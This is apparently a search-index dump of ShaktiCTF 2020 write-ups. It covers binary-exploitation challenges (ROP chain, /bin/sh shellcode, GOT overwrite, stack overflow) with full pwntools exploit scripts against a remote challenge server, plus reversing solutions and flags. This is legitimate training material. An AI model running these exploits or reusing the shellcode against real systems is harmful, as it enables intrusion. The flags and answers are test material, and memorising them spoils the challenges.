Author"},{"location":"ShaktiCTF20/pwning/adventure_chain/#challenge-description","text":"Kathleen is on her next adventure, which marked her name in history of Computer Science forever. Looks like the pieces of her ARC code seem to be brewing something notorious. Follow the chains which might lead you to a hideous place where you can claim your mastery and discover the unintended invention","title":"Challenge Description"},{"location":"ShaktiCTF20/pwning/adventure_chain/#short-writeup","text":"Use ROPgadgets to bypass the argument checks and finally call the function which reads flag.txt. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',4444) p.sendlineafter(\">> \",\"1\") pop_rdi = p64(0x0000000000400a93) pop_rsi_r15 = p64(0x0000000000400a91) assert_ = p64(0x00000000004007d7) setValue = p64(0x00000000004007ec) flag = p64(0x000000000040082c) #exp = \"a\"*56 + auth + pop_rdi + p64(0xdeadbeef) + add_bal + pop_rdi + p64(0xba5eba11) + pop_rsi_r15 + p64(0xbedabb1e) + p64(0xbedabb1e) + flag exp = \"a\"*40 exp += assert_ exp += pop_rdi + p64(0xdeadbeef) exp += setValue exp += pop_rdi + p64(0xdeadc0de) exp += pop_rsi_r15 + p64(0xdead10cc) + \"a\"*8 exp += flag #gdb.attach(p) p.sendlineafter(\"Enter your name:\",exp) p.interactive()","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/adventure_chain/#flag","text":"shaktictf{r0pe_climbing_chaining_1337_way}","title":"Flag"},{"location":"ShaktiCTF20/pwning/compute_shell/","text":"Compute Shell Challenge Author b3y0nd3r Challenge Description Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the \"alpha\" in your favour! Short writeup A simple shellcode challenge. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',3333) p.recvuntil(\"Memory leak detected:\") p.recvline() leak = int(p.recvline().strip(),16) print(hex(leak)) #gdb.attach(p) p.recvuntil(\"Enter your code of action:\") exp = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\".ljust(0x48,\"\\x90\") exp += p64(leak) print(len(exp)) p.sendline(exp) p.interactive() Flag shaktictf{cracking_v0n_neUmann_up}","title":"Compute Shell"},{"location":"ShaktiCTF20/pwning/compute_shell/#compute-shell","text":"","title":"Compute Shell"},{"location":"ShaktiCTF20/pwning/compute_shell/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/compute_shell/#challenge-description","text":"Von Neumann Architecture - a boon to Computer Science, but its major strength hides a weakness. Junior Kathleen is working on a meek looking code but looks like this could be hiding the unknown. Gear up and turn the \"alpha\" in your favour!","title":"Challenge Description"},{"location":"ShaktiCTF20/pwning/compute_shell/#short-writeup","text":"A simple shellcode challenge. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',3333) p.recvuntil(\"Memory leak detected:\") p.recvline() leak = int(p.recvline().strip(),16) print(hex(leak)) #gdb.attach(p) p.recvuntil(\"Enter your code of action:\") exp = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\".ljust(0x48,\"\\x90\") exp += p64(leak) print(len(exp)) p.sendline(exp) p.interactive()","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/compute_shell/#flag","text":"shaktictf{cracking_v0n_neUmann_up}","title":"Flag"},{"location":"ShaktiCTF20/pwning/connect/","text":"Connect Challenge Author b3y0nd3r Description Your adventure begins here to help the renowned Computer Scientist Kathleen Booth to get across the challenges and win the race. Cross the gates and enter into the arena! Short writeup A very easy challenge. One just has to connect using the nc command and use bash commands like ls and cat to get the flag. Flag shaktictf{w3lc0me_t0_th3_ar3na_c0mrade}","title":"Connect"},{"location":"ShaktiCTF20/pwning/connect/#connect","text":"","title":"Connect"},{"location":"ShaktiCTF20/pwning/connect/#challenge-author","text":"b3y0nd3r","title":"Challenge Author"},{"location":"ShaktiCTF20/pwning/connect/#description","text":"Your adventure begins here to help the renowned Computer Scientist Kathleen Booth to get across the challenges and win the race. Cross the gates and enter into the arena!","title":"Description"},{"location":"ShaktiCTF20/pwning/connect/#short-writeup","text":"A very easy challenge. One just has to connect using the nc command and use bash commands like ls and cat to get the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/pwning/connect/#flag","text":"shaktictf{w3lc0me_t0_th3_ar3na_c0mrade}","title":"Flag"},{"location":"ShaktiCTF20/pwning/intro/","text":"Binary Exploitation Table containing challenge status Challenge Name Level Author Concept Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudy return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r , rudy GOT overwrite","title":"Binary Exploitation"},{"location":"ShaktiCTF20/pwning/intro/#binary-exploitation","text":"Table containing challenge status Challenge Name Level Author Concept Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudy return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r , rudy GOT overwrite","title":"Binary Exploitation"},{"location":"ShaktiCTF20/pwning/reactor_got/","text":"Reactor_GOT Author b3y0nd3r rudyerudite Description The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time? PS: This challenge use the new updated Ubuntu 18.04 libc Writeup Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial RelRO is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a file chall ) which means the addresses are going to be 4 bytes. To learn more about the GOT table lookup here . Also, PIE is disabled as well- address of the GOT table is unrandomized each time. Let's get started with the challenge, we have 3 options here: add , show , break_armour . Mind you reactor here is a global array declared as: char *reactor[3][4] . void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } Nothing really looks suspicious here other than the signed idx . A possibility of integer overflow? Also, we can allocate/ write anything at reactor+idx , so if negative values of idx are allowed we can truly cause a havoc by overwriting the GOT table. As our reactor is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the libc system or any of the gadgets would help us. I followed the former easier approach. void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } Another thing to notice here is that there is no check on the idx which can be used to print the data stored at reactor+(-idx) location. I used this to get libc leaks as these addresses are randomized on each run because of ASLR . From the leaks I could calculate the address of system and I overwrote GOT table entry of printf with it. I used the 3rd option here, printf(break_) where break_ is '/bin/sh'. Lo and behold, the shell pops up and you cat your flag . As an alternative to getting leaks using the show function you can use the format string vulnerability in printf(break_) and get the required leaks. Exploit from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',5555) def add(idx,data): p.sendlineafter(\"MELTDOWN)\\n\",\"1\") p.sendlineafter(\"index :\\n\",str(idx)) p.sendlineafter(\"data :\\n\",data) def show(idx): p.sendlineafter(\"MELTDOWN)\\n\",\"2\") p.sendlineafter(\"Enter the index :\\n\",str(idx)) def leave(): p.sendlineafter(\"MELTDOWN)\\n\",\"3\") p.sendline(\"/bin/sh\\x00\") show(\"268435454\") print(\"leaks:\") leak = u32(p.recvline()[:4].strip().ljust(4,'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 add(\"268435449\",p32(system)) #gdb.attach(p) leave() p.interactive() Source Code #include<stdio.h> #include<stdlib.h> #include<unistd.h> char *reactor[3][4]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); } void printmenu(){ puts(\"Choose your ACTION:\"); puts(\"1. add\"); puts(\"2. show\"); puts(\"3. break armour\"); } void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } int main() { int choice; int c = 0; initialize(); char break_[8]; printf(\"ARMOUR: enabled! Try to break in ;)\"); gets(break_); while(c != 3){ puts(\"Welcome to The Reactor (current status: MELTDOWN)\"); printmenu(); scanf(\"%d\",&choice); if(choice == 1) add(); else if(choice == 2) show(); else if(choice == 3) { printf(break_); } else exit(0); c += 1; } return 0; }","title":"Reactor_GOT"},{"location":"ShaktiCTF20/pwning/reactor_got/#reactor_got","text":"","title":"Reactor_GOT"},{"location":"ShaktiCTF20/pwning/reactor_got/#author","text":"b3y0nd3r rudyerudite","title":"Author"},{"location":"ShaktiCTF20/pwning/reactor_got/#description","text":"The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time? PS: This challenge use the new updated Ubuntu 18.04 libc","title":"Description"},{"location":"ShaktiCTF20/pwning/reactor_got/#writeup","text":"Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial RelRO is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a file chall ) which means the addresses are going to be 4 bytes. To learn more about the GOT table lookup here . Also, PIE is disabled as well- address of the GOT table is unrandomized each time. Let's get started with the challenge, we have 3 options here: add , show , break_armour . Mind you reactor here is a global array declared as: char *reactor[3][4] . void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } Nothing really looks suspicious here other than the signed idx . A possibility of integer overflow? Also, we can allocate/ write anything at reactor+idx , so if negative values of idx are allowed we can truly cause a havoc by overwriting the GOT table. As our reactor is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the libc system or any of the gadgets would help us. I followed the former easier approach. void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } Another thing to notice here is that there is no check on the idx which can be used to print the data stored at reactor+(-idx) location. I used this to get libc leaks as these addresses are randomized on each run because of ASLR . From the leaks I could calculate the address of system and I overwrote GOT table entry of printf with it. I used the 3rd option here, printf(break_) where break_ is '/bin/sh'. Lo and behold, the shell pops up and you cat your flag . As an alternative to getting leaks using the show function you can use the format string vulnerability in printf(break_) and get the required leaks.","title":"Writeup"},{"location":"ShaktiCTF20/pwning/reactor_got/#exploit","text":"from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',5555) def add(idx,data): p.sendlineafter(\"MELTDOWN)\\n\",\"1\") p.sendlineafter(\"index :\\n\",str(idx)) p.sendlineafter(\"data :\\n\",data) def show(idx): p.sendlineafter(\"MELTDOWN)\\n\",\"2\") p.sendlineafter(\"Enter the index :\\n\",str(idx)) def leave(): p.sendlineafter(\"MELTDOWN)\\n\",\"3\") p.sendline(\"/bin/sh\\x00\") show(\"268435454\") print(\"leaks:\") leak = u32(p.recvline()[:4].strip().ljust(4,'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 add(\"268435449\",p32(system)) #gdb.attach(p) leave() p.interactive()","title":"Exploit"},{"location":"ShaktiCTF20/pwning/reactor_got/#source-code","text":"#include<stdio.h> #include<stdlib.h> #include<unistd.h> char *reactor[3][4]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); } void printmenu(){ puts(\"Choose your ACTION:\"); puts(\"1. add\"); puts(\"2. show\"); puts(\"3. break armour\"); } void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } int main() { int choice; int c = 0; initialize(); char break_[8]; printf(\"ARMOUR: enabled! Try to break in ;)\"); gets(break_); while(c != 3){ puts(\"Welcome to The Reactor (current status: MELTDOWN)\"); printmenu(); scanf(\"%d\",&choice); if(choice == 1) add(); else if(choice == 2) show(); else if(choice == 3) { printf(break_); } else exit(0); c += 1; } return 0; }","title":"Source Code"},{"location":"ShaktiCTF20/pwning/returning/","text":"Adventure Chain Author rudyerudite Description Kathleen is faced with a very naive looking code which keeps all you secrets and never lets anyone know. Try figuring out lies here! Solution Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : No NX : Yes PIE : No Fortify : No RelRO : Partial We see that canary is disabled here which might give us a possible buffer overflow if we are able to get a primitive. Another thing, PIE is disbaled as well, so that means the addresses of all user defined functions and global variables are going to be same on each run. So let's look at the disassmebly of the binary. We see that the binary lets us input 20 characters. We can do this atmost 2 times. Sound uninteresting at this point? Let's have a closer look at what the main is upto (mind that count , buffer1 , ch and pos are global variables not in the snippet for brevity): void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; } Okay, depending on the return value of snprintf we can read pos bytes on our buffer. As we earlier saw that the Canary is disbaled on stack, thus if pos > sizeof(buffer) we can cause a stack buffer overflow! Now that's something worth noting. Moving on, is it possible to fulfill that condition? Let's have a closer look at the snprintf function. On a quick lookup by doing man sprintf on your terminal, you'll find that snprintf returns the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. --> Does that strike anything? So well sprintf here is writing 1 byte from buffer1 to buffer . If I read 20 bytes into buffer1 could you think about the return value of the function snprintf ? Leaving that as an exercise to the reader. By using the trick of the return value of sprintf (added each time to pos ), we can increment pos to a value such that pos > sizeof(buffer) . Doing this would give us a buffer overflow. We have another interesting function which we didn't check before, but this one is not getting called anywhere in our whole program: void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } We initially saw that PIE is disabled on the binary, thus we just have to overwrite the return address of main() to the win() function in order to call ' win() after main() function returns. What does that do now? As we can see that calling win() would help us read the flag.txt file, this is supposed to be our final destination. So exploit the overflow to overwrite the return address and run away with the flag! Exploit from pwn import * #p = process(\"./chall\") p = remote(\"34.72.218.129\",2222) p.sendline(\"y\") p.sendline(\"a\"*19) p.sendline(\"y\") p.sendline(\"b\"*19) p.sendline(\"n\") #gdb.attach(p) payload = 'a'*24 + p64(0x400921) p.sendline(payload) p.interactive() Source Code #include<stdio.h> #include<stdlib.h> #include<unistd.h> #include<string.h> int count=0, pos=0; char buffer1[20]; char ch[2]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); alarm(30); } void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; }","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/returning/#adventure-chain","text":"","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/returning/#author","text":"rudyerudite","title":"Author"},{"location":"ShaktiCTF20/pwning/returning/#description","text":"Kathleen is faced with a very naive looking code which keeps all you secrets and never lets anyone know. Try figuring out lies here!","title":"Description"},{"location":"ShaktiCTF20/pwning/returning/#solution","text":"Before getting our hands dirty on the binary, we execute a initial checksec chall which tells us about the mitigations enabled on the binary. Canary : No NX : Yes PIE : No Fortify : No RelRO : Partial We see that canary is disabled here which might give us a possible buffer overflow if we are able to get a primitive. Another thing, PIE is disbaled as well, so that means the addresses of all user defined functions and global variables are going to be same on each run. So let's look at the disassmebly of the binary. We see that the binary lets us input 20 characters. We can do this atmost 2 times. Sound uninteresting at this point? Let's have a closer look at what the main is upto (mind that count , buffer1 , ch and pos are global variables not in the snippet for brevity): void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; } Okay, depending on the return value of snprintf we can read pos bytes on our buffer. As we earlier saw that the Canary is disbaled on stack, thus if pos > sizeof(buffer) we can cause a stack buffer overflow! Now that's something worth noting. Moving on, is it possible to fulfill that condition? Let's have a closer look at the snprintf function. On a quick lookup by doing man sprintf on your terminal, you'll find that snprintf returns the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. --> Does that strike anything? So well sprintf here is writing 1 byte from buffer1 to buffer . If I read 20 bytes into buffer1 could you think about the return value of the function snprintf ? Leaving that as an exercise to the reader. By using the trick of the return value of sprintf (added each time to pos ), we can increment pos to a value such that pos > sizeof(buffer) . Doing this would give us a buffer overflow. We have another interesting function which we didn't check before, but this one is not getting called anywhere in our whole program: void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } We initially saw that PIE is disabled on the binary, thus we just have to overwrite the return address of main() to the win() function in order to call ' win() after main() function returns. What does that do now? As we can see that calling win() would help us read the flag.txt file, this is supposed to be our final destination. So exploit the overflow to overwrite the return address and run away with the flag!","title":"Solution"},{"location":"ShaktiCTF20/pwning/returning/#exploit","text":"from pwn import * #p = process(\"./chall\") p = remote(\"34.72.218.129\",2222) p.sendline(\"y\") p.sendline(\"a\"*19) p.sendline(\"y\") p.sendline(\"b\"*19) p.sendline(\"n\") #gdb.attach(p) payload = 'a'*24 + p64(0x400921) p.sendline(payload) p.interactive()","title":"Exploit"},{"location":"ShaktiCTF20/pwning/returning/#source-code","text":"#include<stdio.h> #include<stdlib.h> #include<unistd.h> #include<string.h> int count=0, pos=0; char buffer1[20]; char ch[2]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); alarm(30); } void win() { char flag[50]; FILE *ptr; ptr = fopen(\"flag.txt\",\"r\"); if(ptr == NULL) { printf(\"Error!\"); exit(1); } fgets(flag,50, (FILE*)ptr); printf(\"%s\\n\",flag); exit(0); } void main() { char buffer[8]; initialize(); puts(\"\\nWelcome! A lonely mute program is all I am...\"); puts(\"\\nWould you like to talk to me? (y/n)\"); scanf(\"%c\",&ch[1]); while(ch[1]=='y' && count<2) { puts(\"Say something...\"); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1,\"%s\",buffer1); puts(\"\\nWould you like to continue talking to me? (y/n)\"); scanf(\"%c\",&ch[1]); count+=1; } printf(\"%d Any bidding words?\\n\",pos); getchar(); read(0,buffer,pos); return; }","title":"Source Code"},{"location":"ShaktiCTF20/reversing/EZ/","text":"EZ Challenge discription Lets try a beginners windows challenge!!! Author : bl4ck_Widw Writeup: The file provided is a executable file , that can be reversed in windows OS. By using IDA decompilor in windows , you can get the pseudocode of the challenge. Using that it will be very easy to reverse the program. All you have to do is reverse the functions and use the given string to find the input which will be the key. If the key you gave in is correct , use that key as the passcode in the executable ,to obtain the flag! The solution script: Here give the input as \"lcZdl_Yoati+Xjn,lN!gGRdNR-R]H`=XjN,lo*+Iv\" Shown in the challenge file and get the input to be used as the passcode. #include<stdio.h> #include<string.h> char* lol(char *input){ int i; for(i=0;input[i]!='\\0';i++){ if(i>6&&i<=16){ input[i]=input[i]--; } if(i>=0&&i<4){ input[i]=input[i]++; } if(i>=4&&i<=6){ input[i]=input[i]+3; } if(i<30&&i>16){ input[i]=input[i]^4; } else input[i]=input[i]-5; } printf(\"%s\\n\",input); return input; } char* solo(char *soul){ int l; for(l=0;soul[l]!='\\0';l++){ soul[l]=((soul[l]+5)^1); } return soul; } int main(){ char input[100],ch; char output[100]; printf(\"Enter passcode : \\n\"); fgets(input,42,stdin); strcpy(output,solo(lol(input))); printf(\"Input should be :%s\\n\",output ); } Flag :shaktictf{n0_qu3sT1oN_iS_4_dUmB_qU3st10N}","title":"EZ"},{"location":"ShaktiCTF20/reversing/EZ/#ez","text":"Challenge discription Lets try a beginners windows challenge!!! Author : bl4ck_Widw Writeup: The file provided is a executable file , that can be reversed in windows OS. By using IDA decompilor in windows , you can get the pseudocode of the challenge. Using that it will be very easy to reverse the program. All you have to do is reverse the functions and use the given string to find the input which will be the key. If the key you gave in is correct , use that key as the passcode in the executable ,to obtain the flag!","title":"EZ"},{"location":"ShaktiCTF20/reversing/EZ/#the-solution-script","text":"Here give the input as \"lcZdl_Yoati+Xjn,lN!gGRdNR-R]H`=XjN,lo*+Iv\" Shown in the challenge file and get the input to be used as the passcode. #include<stdio.h> #include<string.h> char* lol(char *input){ int i; for(i=0;input[i]!='\\0';i++){ if(i>6&&i<=16){ input[i]=input[i]--; } if(i>=0&&i<4){ input[i]=input[i]++; } if(i>=4&&i<=6){ input[i]=input[i]+3; } if(i<30&&i>16){ input[i]=input[i]^4; } else input[i]=input[i]-5; } printf(\"%s\\n\",input); return input; } char* solo(char *soul){ int l; for(l=0;soul[l]!='\\0';l++){ soul[l]=((soul[l]+5)^1); } return soul; } int main(){ char input[100],ch; char output[100]; printf(\"Enter passcode : \\n\"); fgets(input,42,stdin); strcpy(output,solo(lol(input))); printf(\"Input should be :%s\\n\",output ); } Flag :shaktictf{n0_qu3sT1oN_iS_4_dUmB_qU3st10N}","title":"The solution script:"},{"location":"ShaktiCTF20/reversing/PYthn/","text":"PYthn Challenge description Familiar with python? Author : bl4ck_Widw Writeup The challenge is really basic and simple for people who are familiar with python programing. The program need to be reversed to get the flag . The source code: Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])+i+5)) else: Z.append(chr(ord(inp[i])+4)) return(''.join(Z)) def fuN(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)-1)) elif(char.isupper()): result += chr((ord(char) + s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result X=input(\"Enter input:\") k=FuN(Fun(X)) if(Q!=k): print(\"NO\") else: print(\"Flag: shaktictf{\"+X+\"}\") Here the variable k , is getting a string returned from two functions - FuN() and Fun(). (Note that function fuN is never used ) The input is simply passed on to the two functions and and the ouptput 'k' is compared with the string 'K78m)hm=|cwsXhbH}uq5w4sJbPrw6'. All we have to do is , find the input from this by reversing the functions to get the flag . Solution script: y=[] Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])-5-i)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) k=Fun(FuN(Q)) print(\"shaktictf{\"+k+\"}\") flag : shaktictf{G00d!_c0nTinUe_Expl0r1nG_Mor3}","title":"PYthn"},{"location":"ShaktiCTF20/reversing/PYthn/#pythn","text":"","title":"PYthn"},{"location":"ShaktiCTF20/reversing/PYthn/#challenge-description","text":"Familiar with python? Author : bl4ck_Widw","title":"Challenge description"},{"location":"ShaktiCTF20/reversing/PYthn/#writeup","text":"The challenge is really basic and simple for people who are familiar with python programing. The program need to be reversed to get the flag . The source code: Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])+i+5)) else: Z.append(chr(ord(inp[i])+4)) return(''.join(Z)) def fuN(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)-1)) elif(char.isupper()): result += chr((ord(char) + s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result X=input(\"Enter input:\") k=FuN(Fun(X)) if(Q!=k): print(\"NO\") else: print(\"Flag: shaktictf{\"+X+\"}\") Here the variable k , is getting a string returned from two functions - FuN() and Fun(). (Note that function fuN is never used ) The input is simply passed on to the two functions and and the ouptput 'k' is compared with the string 'K78m)hm=|cwsXhbH}uq5w4sJbPrw6'. All we have to do is , find the input from this by reversing the functions to get the flag . Solution script: y=[] Z=[] k=[] Q=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i<11): Z.append(chr(ord(inp[i])-5-i)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) k=Fun(FuN(Q)) print(\"shaktictf{\"+k+\"}\") flag : shaktictf{G00d!_c0nTinUe_Expl0r1nG_Mor3}","title":"Writeup"},{"location":"ShaktiCTF20/reversing/assemble/","text":"Assemble! Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 13 Challenge Description Your input is your flag. Flag format: shaktictf{input1,input2,input3} Solution We have to input three numbers which pass a series of conditions which on the end should give us Correct as an output. So here, ebx contains our 2nd input and DWORD[ebp-0x4] is our first input. And their sum should be equal to 0xdeadbeef. mov ebx, DWORD[ebp-0xc] add ebx, DWORD[ebp-0x4] cmp ebx,0xdeadbeef jne N Then we put a condition on our first input and second input. Our first input should be less than 0x6f56df65. And our second input should be 0x6f56df8d. So we find that our first input becomes 0x6f56df62(keeping in mind the above condition). cmp DWORD[ebp-0x4], 0x6f56df65 jg N cmp DWORD[ebp-0xc], 0x6f56df8d jg N cmp DWORD[ebp-0xc], 0x6f56df8d jl N Onto finding our third input, we see that our second input is being xored with our third input. We already know our second input so our third input is 1867964301 ^ 2103609845 which is 305419896 mov ecx, DWORD[ebp-0x14] mov ebx, DWORD[ebp-0xc] xor ecx, ebx cmp ecx, 2103609845 jne N Flag shaktictf{1867964258,1867964301,305419896}","title":"Assemble!"},{"location":"ShaktiCTF20/reversing/assemble/#assemble","text":"Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 13","title":"Assemble!"},{"location":"ShaktiCTF20/reversing/assemble/#challenge-description","text":"Your input is your flag. Flag format: shaktictf{input1,input2,input3}","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/assemble/#solution","text":"We have to input three numbers which pass a series of conditions which on the end should give us Correct as an output. So here, ebx contains our 2nd input and DWORD[ebp-0x4] is our first input. And their sum should be equal to 0xdeadbeef. mov ebx, DWORD[ebp-0xc] add ebx, DWORD[ebp-0x4] cmp ebx,0xdeadbeef jne N Then we put a condition on our first input and second input. Our first input should be less than 0x6f56df65. And our second input should be 0x6f56df8d. So we find that our first input becomes 0x6f56df62(keeping in mind the above condition). cmp DWORD[ebp-0x4], 0x6f56df65 jg N cmp DWORD[ebp-0xc], 0x6f56df8d jg N cmp DWORD[ebp-0xc], 0x6f56df8d jl N Onto finding our third input, we see that our second input is being xored with our third input. We already know our second input so our third input is 1867964301 ^ 2103609845 which is 305419896 mov ecx, DWORD[ebp-0x14] mov ebx, DWORD[ebp-0xc] xor ecx, ebx cmp ecx, 2103609845 jne N","title":"Solution"},{"location":"ShaktiCTF20/reversing/assemble/#flag","text":"shaktictf{1867964258,1867964301,305419896}","title":"Flag"},{"location":"ShaktiCTF20/reversing/damez/","text":"damEz Challenge Description Oops! There was a sudden crash on Margret's system. She's afraid that she lost the passcode which she needs in urgency for running a simple prog which hopefully was backed up. Could you figure out the passcode and run the program successfully. Short writeup String Compare. The flag is hardcoded in the binary. If you simply do strings challfile you get all the strings in the program. One of them is the flag. Flag shaktictf{K33p_th3_gam3_g0ing_gurl!}","title":"damEz"},{"location":"ShaktiCTF20/reversing/damez/#damez","text":"","title":"damEz"},{"location":"ShaktiCTF20/reversing/damez/#challenge-description","text":"Oops! There was a sudden crash on Margret's system. She's afraid that she lost the passcode which she needs in urgency for running a simple prog which 